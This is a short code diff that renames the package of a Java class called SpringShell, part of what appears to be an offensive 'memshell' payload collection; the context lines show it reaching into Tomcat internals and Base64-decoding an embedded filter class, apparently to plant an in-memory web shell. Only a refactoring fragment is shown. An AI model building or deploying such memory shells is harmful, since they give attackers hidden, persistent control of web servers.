@@ -1,4 +1,4 @@
-package http.payloads.memshell;
+package payload.memshell;
 
 import org.apache.catalina.Context;
 import org.apache.catalina.core.ApplicationFilterConfig;
@@ -46,7 +46,7 @@ public class SpringShell {
             ClassLoader cl = Thread.currentThread().getContextClassLoader();
             Class<?> clazz;
             try {
-                clazz = cl.loadClass("http.payloads.memshell.DynamicFilter");
+                clazz = cl.loadClass("payload.memshell.DynamicFilter");
             } catch (ClassNotFoundException e) {
                 byte[] bytes = Base64.getDecoder().decode(filterCode);
 
